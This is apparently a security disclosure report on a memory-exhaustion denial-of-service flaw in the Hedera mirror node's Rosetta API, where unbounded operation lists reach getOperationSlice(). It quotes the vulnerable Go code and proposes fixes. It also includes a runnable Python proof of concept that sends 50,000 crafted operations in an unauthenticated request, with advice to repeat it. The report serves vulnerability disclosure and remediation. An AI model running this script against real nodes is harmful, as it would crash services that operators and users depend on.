### Title
Unbounded Operation Count in `getOperationSlice()` Enables Memory Exhaustion DoS on Rosetta Mirror Node

### Summary
`getOperationSlice()` in `rosetta/app/services/construction_service.go` iterates over and allocates memory for every element in the caller-supplied `operations` slice with no upper bound on count. Both `ConstructionPreprocess` and `ConstructionPayloads` pass the raw, unauthenticated request operations directly to this function. An attacker can send a single POST request containing tens of thousands of crafted operations, causing unbounded heap growth and OOM-killing the Rosetta process.

### Finding Description

**Exact code path:**

`ConstructionPreprocess` (line 289) and `ConstructionPayloads` (line 232) both call `getOperationSlice(request.Operations)` before any count check:

```go
// line 432-465, construction_service.go
func (c *constructionAPIService) getOperationSlice(operations []*rTypes.Operation) (
    types.OperationSlice,
    *rTypes.Error,
) {
    operationSlice := make(types.OperationSlice, 0, len(operations))  // allocates cap = attacker-controlled
    for _, operation := range operations {
        // per-operation: NewAccountIdFromString, NewAmount, struct append
        operationSlice = append(operationSlice, types.Operation{ ... })
    }
    return operationSlice, nil
}
``` [1](#0-0) 

**Root cause:** There is no check on `len(operations)` before the loop. The slice is pre-allocated with `cap = len(operations)` (attacker-controlled), and each iteration performs string parsing (`NewAccountIdFromString`) and struct construction.

**Why downstream checks are insufficient:**

`validateOperations` in `common.go` is called only *after* `getOperationSlice()` returns, inside `transactionHandler.Preprocess/Construct`. For `cryptoTransfer`, it is called with `size=0` (no count limit):

```go
// common.go line 125
if err := validateOperations(operations, 0, c.GetOperationType(), false); err != nil {
``` [2](#0-1) 

`cryptoTransferTransactionConstructor.preprocess()` then allocates a second slice (`transfers := make([]transfer, 0, len(operations))`) and a `totalAmounts` map, iterating every operation again: [3](#0-2) 

**No application-level body size limit exists.** A search of all rosetta Go source finds zero uses of `http.MaxBytesReader`, `ReadLimit`, or any equivalent. The HTTP server sets timeouts but no body byte cap: [4](#0-3) 

**The Traefik middleware** (`inFlightReq: 5`, `rateLimit: average: 10`) is defined only in the Helm chart `values.yaml` and is gated on `global.middleware && middleware` being set. It is not enforced by the application itself, is trivially bypassed by direct pod access, and the per-host rate limit does not prevent a single large request: [5](#0-4) 

### Impact Explanation
A single malformed POST to `/construction/preprocess` (available in both online and offline modes, no authentication) with ~50,000 `cryptoTransfer` operations (balanced amounts so the sum-to-zero check passes) causes the Rosetta Go process to allocate hundreds of MB to GB of heap in one request. Repeated requests, or a single sufficiently large one, OOM-kills the process. This disrupts the mirror node's ability to forward transactions to consensus nodes via the Rosetta Construction API, satisfying the stated scope of ≥30% disruption of network processing capability without brute force.

### Likelihood Explanation
The endpoint requires no credentials, no API key, and no prior state. The exploit is a single HTTP POST with a crafted JSON body. Any external user who can reach the Rosetta port (default 5700) can trigger it. The attack is repeatable and automatable. The only infrastructure-level mitigation (Traefik middleware) is optional and bypassable.

### Recommendation
1. **Enforce a hard cap on operation count** at the entry point of `getOperationSlice()`:
   ```go
   const maxOperations = 1000 // or a configurable value
   if len(operations) > maxOperations {
       return nil, errors.ErrInvalidOperations
   }
   ```
2. **Add an HTTP request body size limit** using `http.MaxBytesReader` in the server middleware, e.g. 1 MB.
3. **Make the Traefik `inFlightReq` and `rateLimit` middleware mandatory** (not opt-in) in the default deployment configuration.

### Proof of Concept

```python
import requests, json

# Build 50,000 balanced cryptoTransfer operations (sum = 0)
ops = []
for i in range(25000):
    ops.append({
        "operation_identifier": {"index": i*2},
        "type": "CRYPTOTRANSFER",
        "account": {"address": "0.0.100"},
        "amount": {"value": "-1", "currency": {"symbol": "HBAR", "decimals": 8}}
    })
    ops.append({
        "operation_identifier": {"index": i*2+1},
        "type": "CRYPTOTRANSFER",
        "account": {"address": "0.0.200"},
        "amount": {"value": "1", "currency": {"symbol": "HBAR", "decimals": 8}}
    })

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "operations": ops
}

# Single unauthenticated POST — no credentials required
r = requests.post(
    "http://<rosetta-host>:5700/construction/preprocess",
    json=payload,
    timeout=120
)
print(r.status_code)
# Repeat in a loop or increase ops count to exhaust memory
```

Each request forces `getOperationSlice()` to allocate and populate 50,000 `types.Operation` structs, then `cryptoTransferTransactionConstructor.preprocess()` allocates a second 50,000-element `transfers` slice. Repeated requests exhaust heap and OOM-kill the process.

func (c *constructionAPIService) getOperationSlice(operations []*rTypes.Operation) (
	types.OperationSlice,
	*rTypes.Error,
) {
	operationSlice := make(types.OperationSlice, 0, len(operations))
	for _, operation := range operations {
		var accountId types.AccountId
		if operation.Account != nil {
			var err error
			accountId, err = types.NewAccountIdFromString(operation.Account.Address, c.systemShard, c.systemRealm)
			if err != nil || accountId.IsZero() {
				return nil, errors.ErrInvalidAccount
			}
		}

		var amount types.Amount
		var rErr *rTypes.Error
		if operation.Amount != nil {
			if amount, rErr = types.NewAmount(operation.Amount); rErr != nil {
				return nil, rErr
			}
		}

		operationSlice = append(operationSlice, types.Operation{
			AccountId: accountId,
			Amount:    amount,
			Index:     operation.OperationIdentifier.Index,
			Metadata:  operation.Metadata,
			Type:      operation.Type,
		})
	}

	return operationSlice, nil
}
